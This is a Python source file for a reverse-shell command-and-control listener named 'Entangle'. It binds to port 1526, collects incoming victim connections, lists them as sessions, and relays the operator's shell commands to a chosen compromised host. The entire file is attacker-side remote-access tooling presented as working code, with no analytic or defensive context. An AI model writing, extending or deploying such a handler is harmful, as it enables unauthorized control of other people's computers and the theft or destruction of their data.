import socket
import json
import os
import threading
import base64


def shell(target,ip):
    def send(data):
        json_data = json.dumps(data)
        target.send(json_data)

    def receive():
        data = ""
        while True:
            try:
                data = data + target.recv(1024)
                return json.loads(data)
            except ValueError:
                continue

    global count

    while True:
        command = raw_input("Session~# " )
        send(command)
        if command == "":
            continue

        elif command == 'detach':
            break

        elif command == "quit":
            target.close()
            targets.remove(target)
            ips.remove(ip)
            break

        elif command[:2] == "cd" and len(command) > 1:
            continue
        else:
            result = receive()
            print(result)


def server():
    global clients
    while True:
        if stop_threads:
            break
        #s.settimeout(1)
        try:
            target, ip = s.accept()
            targets.append(target)
            ips.append(ip)
            print ("**** " + ip[0] + " Has Connected ****")
            #print(str(ips[clients]) + " Has Connected!")
            clients += 1
        except:
            pass


global s
ips = []
targets = []
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("0.0.0.0", 1526))
s.listen(5)

clients = 0
stop_threads = False

print("Waiting for connections ....")

t1 = threading.Thread(target=server)
t1.start()

while True:
    command = raw_input("Entangle: ")
    if command == "show":
       count = 0
       for ip in ips:
           print ("Session " + str(count) + " ----> " + str(ip))
           count +=1

    elif command[:7] == "session":
        try:
            num = int(command[8:])
            tarnum = targets[num]
            tarip = ips[num]
            shell(tarnum,tarip)
        except:
            print("Session not %s Found!" % num)
            continue
    elif command == "exit":
        for target in targets:
            target.close()
        s.close()
        stop_threads = True
        t1.join()
        break
